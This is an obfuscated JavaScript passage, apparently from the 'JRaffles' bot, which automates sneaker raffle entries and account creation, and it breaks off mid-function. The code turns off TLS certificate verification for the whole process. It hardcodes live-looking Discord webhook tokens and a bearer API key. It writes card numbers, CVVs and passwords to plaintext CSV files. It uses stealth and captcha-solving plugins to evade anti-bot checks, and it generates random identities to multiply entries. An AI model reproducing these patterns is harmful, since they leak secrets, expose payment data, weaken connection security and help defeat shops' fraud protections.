process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x3601e1 = require('fs'), _0x48b3d9 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x2dd598(_0x22f8bf) {
    const _0x4c516e = _0x3601e1['createWriteStream'](_0x22f8bf, { 'flags': 'a' }), _0xd1157d = console['log'];
    console['log'] = function () {
        const _0x47b6da = Array['prototype']['slice']['call'](arguments), _0x14818e = _0x47b6da['join']('\x20') + '\x0a';
        _0x4c516e['write'](_0x14818e), _0xd1157d['apply'](console, _0x47b6da);
    };
}
_0x2dd598('../logs/log\x20' + _0x48b3d9);
var _0x4d9dc6 = require('tough-cookie'), _0x2fec54 = require('node-imap'), _0x56e1fa = require('util')['inspect'];
const _0xe064d3 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x207c71 } = require('discord.js');
var _0x53002b = require('exe');
const { execFile: _0xb6694c } = require('child_process'), _0xd499ac = require('puppeteer-extra'), _0x288308 = require('puppeteer-extra-plugin-recaptcha'), _0x3295ba = require('puppeteer-extra-plugin-stealth'), _0x1b5f76 = require('chalk'), _0xd208b3 = require('node-bash-title'), _0x2c145d = require('axios'), _0x199bc3 = require('papaparse');
var _0x36c11c = require('random-name');
const _0x173581 = require('request');
var _0x15dd71 = require('prompt');
const _0x4054b9 = _0x173581['jar']();
var _0x6a12f3 = {};
const _0x1ff543 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x45b1a7 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x4a5479 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3d9c3a = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4b6da8 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1bf04e = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x5437ca = 'https://discord.com/api/webhooks/', _0x1ed0fd = '' + _0x5437ca + _0x4a5479, _0x70ae37 = '' + _0x5437ca + _0x3d9c3a, _0x105382 = '' + _0x5437ca + _0x1ff543, _0x32fdb9 = '' + _0x5437ca + _0x45b1a7, _0x1d6d5c = '' + _0x5437ca + _0x4b6da8, _0xa6dcbb = '' + _0x5437ca + _0x1bf04e;
const _0x4c04f6 = JSON['parse'](_0x3601e1['readFileSync']('../package.json', 'utf-8')), _0x5696e3 = _0x4c04f6['version'];
var _0x33ba4e, _0x53dc6d, _0x1e632a, _0x55c8a9, _0x594b52, _0x1b3d49, _0x3919f0, _0x42cc6f;
const _0x4ea17d = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x5bad83 = ![];
const _0x5c2c6f = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x530af9 = '0123456789';
var _0x1e8195 = _0x5c2c6f['split']('');
const _0x28df8a = require('auto-git-update'), _0x2902c0 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x682f77 = new _0x28df8a(_0x2902c0);
async function _0x19146c() {
    _0x594b52 = _0x3601e1['readdirSync']('../proxies'), _0x55c8a9 = _0x3601e1['readdirSync']('../tasks'), !_0x3601e1['existsSync']('../accounts/fenom.csv') && _0x3601e1['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x3601e1['existsSync']('../accounts/paypal.csv') && _0x3601e1['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x3601e1['existsSync']('../accounts/bstn.csv') && _0x3601e1['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x3601e1['existsSync']('../accounts/eql.csv') && _0x3601e1['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x3601e1['existsSync']('../failed-tasks.csv') && _0x3601e1['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x3601e1['existsSync']('../successful-tasks.csv') && _0x3601e1['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x6a12f3 = JSON['parse'](_0x3601e1['readFileSync']('../settings.json', 'utf-8')), !_0x6a12f3['delay'] && (_0x6a12f3['delay'] = 0x3c, _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), !_0x6a12f3['threads'] && (_0x6a12f3['threads'] = 0x1, _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), !_0x6a12f3['masterMail'] && (_0x6a12f3['masterMail'] = 'yourmail@gmail.com', _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), !_0x6a12f3['masterPassword'] && (_0x6a12f3['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), !_0x6a12f3['captchaKey'] && (_0x6a12f3['captchaKey'] = '', _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), !_0x6a12f3['useRandomProxy'] && (_0x6a12f3['useRandomProxy'] = !![], _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), !_0x6a12f3['shuffleTasks'] && (_0x6a12f3['shuffleTasks'] = ![], _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), !_0x6a12f3['webhook'] && (_0x6a12f3['webhook'] = '', _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), _0x6a12f3['delay'] <= 0x1388 && (_0x6a12f3['delay'] = _0x6a12f3['delay'] * 0x3e8), _0x6a12f3['AfewDelay'] && (delete _0x6a12f3['AfewDelay'], _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), _0x6a12f3['MahaDelay'] && (delete _0x6a12f3['MahaDelay'], _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), _0x6a12f3['footshopDelay'] && (delete _0x6a12f3['footshopDelay'], _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3, null, 0x2))), _0x6a12f3['MahaDelay'] = _0x6a12f3['delay'], _0x5437ca = _0x6a12f3['webhook'], _0x1b3d49 = _0x6a12f3['licenseKey'];
}
let _0x11090f, _0x395848 = [], _0x421a63;
const _0x1d2efb = _0x20b7e7 => new Promise(_0x2a969c => setTimeout(_0x2a969c, _0x20b7e7));
function _0x4d5bf6(_0x2109cb, _0x59ae4d) {
    return Math['floor'](Math['random']() * (_0x59ae4d - _0x2109cb + 0x1) + _0x2109cb);
}
function _0x12a271(_0x54c5ca) {
    let _0x4aef4d = _0x54c5ca['length'], _0x5ab883;
    while (_0x4aef4d != 0x0) {
        _0x5ab883 = Math['floor'](Math['random']() * _0x4aef4d), _0x4aef4d--, [_0x54c5ca[_0x4aef4d], _0x54c5ca[_0x5ab883]] = [
            _0x54c5ca[_0x5ab883],
            _0x54c5ca[_0x4aef4d]
        ];
    }
    return _0x54c5ca;
}
async function _0xcf56cd(_0x4c58da) {
    return _0x2c145d['get']('https://api.hyper.co/v4/licenses/' + _0x4c58da, { 'headers': { 'Authorization': 'Bearer\x20' + _0x4ea17d } })['then'](_0x589aef => _0x589aef['data'])['catch'](() => null);
}
;
async function _0x564aa3(_0x2dd73d) {
    console['clear']();
    if (_0x2dd73d == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x19e798 = await _0x15dd71['get']('License');
        if (_0x19e798['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x1d2efb(0xbb8), _0x564aa3(_0x2dd73d);
        _0x2dd73d = _0x19e798['License'], _0x6a12f3['licenseKey'] = _0x2dd73d, _0x1b3d49 = _0x2dd73d, _0x3601e1['writeFileSync']('../settings.json', JSON['stringify'](_0x6a12f3));
    }
    console['log']('Checking\x20license\x20' + _0x1b3d49 + '...'), await _0x1d2efb(0x320);
    const _0x24f4c6 = await _0xcf56cd(_0x2dd73d);
    _0x3919f0 = JSON['stringify'](_0x24f4c6['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x42cc6f = JSON['stringify'](_0x24f4c6['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x24f4c6)
        return console['log']('License\x20not\x20found');
    if (!_0x24f4c6['user'])
        return console['log']('License\x20not\x20bound');
    return _0x24f4c6['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x5bad83 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x5bad83 = ![]);
}
async function _0x143736() {
    var _0x4fbc62 = await _0x15dd71['get']('Module');
    return console['clear'](), _0x4fbc62['Module'];
}
;
async function _0x151711() {
    var _0x363847 = await _0x15dd71['get']('Setting');
    return console['clear'](), _0x363847['Setting'];
}
async function _0x4f109d(_0x589782) {
    var _0xadb598 = [];
    for (file of _0x55c8a9) {
        var _0x2e9449 = _0x3601e1['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x199bc3['parse'](_0x2e9449, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x589782['store'] && _0xadb598['push'](file);
    }
    !_0xadb598['length'] == 0x0 && (_0x55c8a9 = _0xadb598);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x361b55 = 0x0; _0x361b55 < _0x55c8a9['length']; _0x361b55++) {
        console['log']('\x20(' + _0x361b55 + ')\x20' + _0x55c8a9[_0x361b55]);
    }
    console['log']('');
    var _0xffdc19 = await _0x15dd71['get']('Task');
    if (_0xffdc19['Task'] > _0x55c8a9['length'] - 0x1 || isNaN(_0xffdc19['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1d2efb(0x3e8), _0x4f109d();
    var _0xd1cf28 = _0x3601e1['readFileSync']('../tasks/' + _0x55c8a9[_0xffdc19['Task']], 'utf-8');
    return _0x1e632a = _0x199bc3['parse'](_0xd1cf28, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1b5f76['blue'](_0x55c8a9[_0xffdc19['Task']])), _0x33ba4e = _0x55c8a9[_0xffdc19['Task']], _0x1e632a;
}
async function _0x296f9f() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x3eb969 = 0x0; _0x3eb969 < _0x594b52['length']; _0x3eb969++) {
        console['log']('\x20(' + _0x3eb969 + ')\x20' + _0x594b52[_0x3eb969]);
    }
    console['log']('');
    var _0x404098 = await _0x15dd71['get']('Proxies');
    if (_0x404098['Proxies'] > _0x594b52['length'] - 0x1 || isNaN(_0x404098['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x1d2efb(0x3e8), _0x296f9f();
    var _0x5b8084 = _0x3601e1['readFileSync']('../proxies/' + _0x594b52[_0x404098['Proxies']], 'utf-8')['split']('\x0a');
    let _0x36c304 = _0x5b8084['map']((_0x44afd3, _0x48f2e8) => {
        sanatizeProxy = _0x44afd3['replace']('\x0d', '');
        if (_0x5b8084[_0x48f2e8 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x53dc6d = _0x594b52[_0x404098['Proxies']], console['clear'](), _0x36c304;
}
async function _0x382d78() {
    var _0x31c537 = await _0x15dd71['get']('Value');
    return console['clear'](), _0x31c537['Value'];
}
async function _0x5dd041(_0x287b67) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x43ff2f = 0x0; _0x43ff2f < _0x287b67['length']; _0x43ff2f++) {
        console['log']('\x20(' + _0x43ff2f + ')\x20[' + _0x287b67[_0x43ff2f]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x49ca56 = await _0x15dd71['get']('Module');
    return _0x49ca56['Module'];
}
async function _0x5cd8c3() {
    var _0x5c443d = await _0x15dd71['get']('Password');
    return console['clear'](), _0x5c443d['Password'];
}
;
async function _0x259c79() {
    var _0xbf20eb = await _0x15dd71['get']('Links');
    return _0xbf20eb['Links'];
}
;
async function _0x2d13ff() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x40bff4 = 0x0; _0x40bff4 < _0x395848['length']; _0x40bff4++) {
        console['log']('\x20(' + _0x40bff4 + ')\x20' + _0x395848[_0x40bff4]);
    }
    ;
    console['log']();
    let _0x4c47ef = await _0x15dd71['get']('Product');
    return console['clear'](), _0x4c47ef['Product'];
}
;
function _0x24cf02() {
    var _0x139b91 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x139b91;
}
;
function _0x1d1f47() {
    var _0x3a0be1 = new Date(Date['now']())['toLocaleString']();
    return _0x3a0be1['replace'](',', '');
}
async function _0x471d59(_0x2c5950, _0x48095e) {
    let _0x1a7b41 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5696e3 != 'devkey') {
        await _0x2c145d['post'](_0x2c5950, _0x48095e, _0x1a7b41);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x3aa619(_0x507231, _0x5a0f76, _0x40ea10, _0x52e17d, _0x387030) {
    if (!_0x52e17d && _0x40ea10 == 'dev') {
        var _0x3f3e17 = new _0x207c71()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x5a0f76['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x5a0f76['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x507231['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x6a12f3['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x3919f0,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x507231['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x507231['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5696e3,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3f3e17['data'];
    } else {
        if (_0x52e17d && _0x40ea10 == 'dev') {
            var _0x3f3e17 = new _0x207c71()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x5a0f76['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x3919f0,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x5a0f76['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x507231['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x6a12f3['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x387030,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x507231['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x507231['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5696e3,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3f3e17['data'];
        } else {
            if (_0x40ea10 == 'pub') {
                var _0x3f3e17 = new _0x207c71()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x5a0f76['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x5a0f76['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x507231['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x6a12f3['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x507231['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5696e3,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3f3e17['data'];
            } else {
                if (_0x40ea10 == 'acc' && !_0x52e17d) {
                    var _0x3f3e17 = new _0x207c71()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x5a0f76['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x3919f0,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x5a0f76['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x6a12f3['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5696e3,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3f3e17['data'];
                } else {
                    if (_0x40ea10 == 'acc' && _0x52e17d) {
                        var _0x3f3e17 = new _0x207c71()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x5a0f76['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x3919f0,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x387030,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x5a0f76['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x6a12f3['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5696e3,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3f3e17['data'];
                    } else {
                        if (_0x40ea10 == 'open') {
                            var _0x3f3e17 = new _0x207c71()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x42cc6f)['addFields']({
                                'name': 'User',
                                'value': '' + _0x3919f0,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5696e3,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3f3e17['data'];
                        } else {
                            if (!_0x52e17d && _0x40ea10 == 'ver') {
                                var _0x3f3e17 = new _0x207c71()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x5a0f76['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x3919f0,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x5a0f76['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x6a12f3['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5696e3,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3f3e17['data'];
                            } else {
                                if (_0x52e17d && _0x40ea10 == 'ver') {
                                    var _0x3f3e17 = new _0x207c71()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x5a0f76['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x3919f0,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x387030,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x5a0f76['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x6a12f3['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5696e3,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3f3e17['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x3cf8c0(_0x3045f6, _0x353407) {
    var _0x4ddf9e = _0x3045f6[_0x353407]['Address1']['split'](''), _0x59a5ad = _0x3045f6[_0x353407]['Address2']['split'](''), _0x33d929 = _0x3045f6[_0x353407]['Email']['split']('@');
    for (var _0x2cb14f = 0x0; _0x2cb14f < _0x4ddf9e['length']; _0x2cb14f++) {
        if (_0x4ddf9e[_0x2cb14f] == 'X') {
            var _0x1010ee = Math['round'](Math['random']() * (_0x5c2c6f['length'] - 0x1));
            _0x4ddf9e[_0x2cb14f] = _0x1e8195[_0x1010ee];
        }
    }
    ;
    for (var _0x2cb14f = 0x0; _0x2cb14f < _0x59a5ad['length']; _0x2cb14f++) {
        if (_0x59a5ad[_0x2cb14f] == 'X') {
            var _0x1010ee = Math['round'](Math['random']() * (_0x5c2c6f['length'] - 0x1));
            _0x59a5ad[_0x2cb14f] = _0x1e8195[_0x1010ee];
        }
    }
    ;
    _0x3045f6[_0x353407]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x3045f6[_0x353407]['FirstName'] = _0x36c11c['first']());
    _0x3045f6[_0x353407]['LastName']['toUpperCase']() == 'RANDOM' && (_0x3045f6[_0x353407]['LastName'] = _0x36c11c['last']());
    _0x33d929[0x0]['toUpperCase']() == 'RANDOM' ? _0x33d929[0x0] = '' + _0x36c11c['first']() + _0x36c11c['last']() + _0x4d5bf6(0x1, 0x3e7) + '@' : _0x33d929[0x0] = _0x33d929[0x0] + '@';
    _0x3045f6[_0x353407]['Email'] = _0x33d929['join'](''), _0x3045f6[_0x353407]['Address1'] = _0x4ddf9e['join'](''), _0x3045f6[_0x353407]['Address2'] = _0x59a5ad['join']('');
    _0x3045f6[_0x353407]['Phone'] == 'RANDOM' && (_0x3045f6[_0x353407]['Phone'] = '0' + _0x4d5bf6(0x5f5e100, 0x3b9ac9ff));
    if (_0x3045f6[_0x353407]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x4e999b = _0x4d5bf6(0x1, 0x270f);
        _0x3045f6[_0x353407]['Follower'] = '' + _0x36c11c['first']() + _0x36c11c['last']() + _0x4e999b + '\x20';
    }
    _0x3045f6[_0x353407]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x3045f6[_0x353407]['HouseNumber'] = _0x4d5bf6(0x1, 0xc8));
    if (_0x3045f6[_0x353407]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0xdb66a4 = Math['round'](Math['random']() * (_0x5c2c6f['length'] - 0x1)), _0x3d6567 = _0x1e8195[_0xdb66a4];
        _0x3045f6[_0x353407]['Address1'] = _0x36c11c['last']() + 'straat', _0x3045f6[_0x353407]['Zip'] == '' && (_0x3045f6[_0x353407]['Postcode'] = _0x4d5bf6(0x3e8, 0x270f) + '\x20' + _0x3d6567 + _0x3d6567, _0x3045f6[_0x353407]['Zip'] = _0x3045f6[_0x353407]['Postcode']), _0x3045f6[_0x353407]['HouseNumber'] = '' + _0x4d5bf6(0x1, 0xc8);
    }
    return;
}
;
async function _0x12ac99(_0x292ede, _0x9ccf76) {
    _0x3601e1['appendFileSync']('../failed-tasks.csv', _0x1d1f47() + ',' + _0x9ccf76['store'] + ',' + _0x9ccf76['name'] + ',' + _0x292ede['Url'] + ',' + _0x292ede['Size'] + ',' + _0x292ede['Follower'] + ',' + _0x292ede['FirstName'] + ',' + _0x292ede['LastName'] + ',' + _0x292ede['Address1'] + ',' + _0x292ede['Address2'] + ',' + _0x292ede['HouseNumber'] + ',' + _0x292ede['Zip'] + ',' + _0x292ede['City'] + ',' + _0x292ede['State'] + ',' + _0x292ede['Country'] + ',' + _0x292ede['Phone'] + ',' + _0x292ede['Email'] + ',' + _0x292ede['Password'] + ',' + _0x292ede['PaymentMethod'] + ',' + _0x292ede['CardType'] + ',' + _0x292ede['NameOnCard'] + ',' + _0x292ede['CardNumber'] + ',' + _0x292ede['ExpiryDate'] + ',' + _0x292ede['CVV'] + ',' + _0x292ede['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x21396e(_0x3b7976, _0x983d39) {
    _0x3601e1['appendFileSync']('../successful-tasks.csv', _0x1d1f47() + ',' + _0x983d39['store'] + ',' + _0x983d39['name'] + ',' + _0x3b7976['Url'] + ',' + _0x3b7976['Size'] + ',' + _0x3b7976['Follower'] + ',' + _0x3b7976['FirstName'] + ',' + _0x3b7976['LastName'] + ',' + _0x3b7976['Address1'] + ',' + _0x3b7976['Address2'] + ',' + _0x3b7976['HouseNumber'] + ',' + _0x3b7976['Zip'] + ',' + _0x3b7976['City'] + ',' + _0x3b7976['State'] + ',' + _0x3b7976['Country'] + ',' + _0x3b7976['Phone'] + ',' + _0x3b7976['Email'] + ',' + _0x3b7976['Password'] + ',' + _0x3b7976['PaymentMethod'] + ',' + _0x3b7976['CardType'] + ',' + _0x3b7976['NameOnCard'] + ',' + _0x3b7976['CardNumber'] + ',' + _0x3b7976['ExpiryDate'] + ',' + _0x3b7976['CVV'] + ',' + _0x3b7976['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x41fb14() {
    let _0x105343 = proxyFile['split']('\x0a'), _0x1a3f53 = _0x105343['map']((_0x38079a, _0x3b9e95) => {
        sanatizeProxy = _0x38079a['replace']('\x0d', '');
        if (_0x105343[_0x3b9e95 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1a3f53;
}
;
async function _0xabbb2a(_0xd28988, _0x3bedfa) {
    if (_0x22d870 != 'yes')
        var _0x22d870 = '', _0x285b3b = 0x0;
    async function _0x1dc336() {
        var _0x5649d1 = _0x3601e1['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x36685f = _0x199bc3['parse'](_0x5649d1, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x518385 = 0x0; _0x518385 < _0x36685f['length']; _0x518385++) {
            console['log']('(' + _0x518385 + ')\x20' + _0x36685f[_0x518385]['Email']);
        }
        console['log']('\x0a(' + _0x36685f['length'] + ')\x20' + _0x1b5f76['cyan']('Add\x20a\x20new\x20account'));
        let _0x3ca7c6 = await _0x15dd71['get']('Option');
        if (_0x3ca7c6['Option'] < _0x36685f['length'])
            return _0x36685f[_0x3ca7c6['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x187b09 = {}, _0x414956 = await _0x15dd71['get']('Email');
